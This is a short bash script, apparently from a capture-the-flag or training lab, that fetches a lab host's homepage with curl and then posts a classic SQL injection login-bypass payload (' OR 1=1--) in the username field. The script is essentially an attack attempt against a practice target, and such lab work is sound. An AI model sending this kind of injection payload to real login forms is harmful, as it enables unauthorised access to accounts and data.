#!/bin/bash
B="http://chatelaine.cylabacademy.net:25024"
echo "=== homepage ==="
curl -s -m 20 "$B/" | head -50
echo
echo "=== login SQLi ==="
curl -s -m 20 -i -d "username=' OR 1=1--&password=x" "$B/" | head -30
